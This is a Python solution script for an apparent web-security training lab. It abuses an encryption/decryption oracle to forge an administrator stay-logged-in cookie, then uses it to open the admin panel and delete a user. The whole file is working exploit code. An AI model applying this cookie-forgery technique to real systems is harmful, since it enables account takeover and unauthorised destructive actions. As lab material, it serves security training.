#!/usr/bin/env python3
# Authentication bypass via encryption oracle
#
# The lab exposes:
#   - an encryption oracle: the email parameter of POST /post/comment is encrypted
#     into the `notification` cookie;
#   - a decryption oracle: the `notification` cookie is decrypted and reflected in
#     the "Invalid email address: ..." error.
#
# The `stay-logged-in` cookie is encrypted with the same key. Decrypt it to learn
# the format (`username:timestamp`), encrypt `administrator:<timestamp>`, strip the
# 23-byte "Invalid email address: " prefix (plus 9 bytes of padding) and reuse the
# ciphertext as the `stay-logged-in` cookie.
#
# Replace HOST with your own lab instance.

import base64
import re
import urllib.parse

import requests

HOST = "0ab900e30437f98481b5520e00d70006.web-security-academy.net"
USER_AGENT = {"User-Agent": "Mozilla/5.0"}


def set_cookie(response, name):
    for header in response.raw.headers.getlist("Set-Cookie"):
        if header.startswith(name + "="):
            return header.split(";", 1)[0].split("=", 1)[1]
    return None


def main():
    session = requests.Session()
    session.headers.update(USER_AGENT)

    # 1) log in with "stay logged in"
    r = session.get("https://%s/login" % HOST)
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
    r = session.post("https://%s/login" % HOST, data={
        "csrf": csrf,
        "username": "wiener",
        "password": "peter",
        "stay-logged-in": "on",
    }, allow_redirects=False)
    stay = set_cookie(r, "stay-logged-in")
    print("[1] logged in, stay-logged-in = %s" % stay)

    # 2) decrypt the stay-logged-in cookie through the notification oracle
    r = requests.get("https://%s/post?postId=9" % HOST,
                     headers={**USER_AGENT, "Cookie": "notification=" + stay})
    match = re.search(r"(wiener:\d+)", r.text)
    if not match:
        raise SystemExit("failed to decrypt stay-logged-in")
    print("[2] decrypted: %s" % match.group(1))
    timestamp = match.group(1).split(":")[1]

    # 3) encrypt administrator:<timestamp> (9 chars of padding for block alignment)
    r = session.get("https://%s/post?postId=9" % HOST)
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
    payload = "xxxxxxxxx" + "administrator:" + timestamp
    r = session.post("https://%s/post/comment" % HOST, data={
        "csrf": csrf,
        "postId": "9",
        "comment": "x",
        "name": "x",
        "email": payload,
        "website": "http://x",
    }, allow_redirects=False)
    notification = set_cookie(r, "notification")
    print("[3] encrypted: %s" % notification)

    # 4) URL-decode + Base64-decode, drop the first 32 bytes, re-encode
    ciphertext = base64.b64decode(urllib.parse.unquote(notification))
    print("[4] ciphertext length: %d" % len(ciphertext))
    forged = urllib.parse.quote(base64.b64encode(ciphertext[32:]).decode(), safe="")
    print("[5] forged stay-logged-in: %s" % forged)

    # 5) use the forged cookie without the session cookie -> administrator
    r = requests.get("https://%s/admin" % HOST,
                     headers={**USER_AGENT, "Cookie": "stay-logged-in=" + forged})
    print("[6] /admin: %d" % r.status_code)

    # 6) delete carlos
    r = requests.get("https://%s/admin/delete?username=carlos" % HOST,
                     headers={**USER_AGENT, "Cookie": "stay-logged-in=" + forged},
                     allow_redirects=False)
    print("[7] delete carlos: %d -> %s" % (r.status_code, r.headers.get("Location")))

    r = requests.get("https://%s/" % HOST,
                     headers={**USER_AGENT, "Cookie": "stay-logged-in=" + forged})
    print("[8] solved: %s" % ("Congratulations, you solved the lab!" in r.text))


if __name__ == "__main__":
    main()
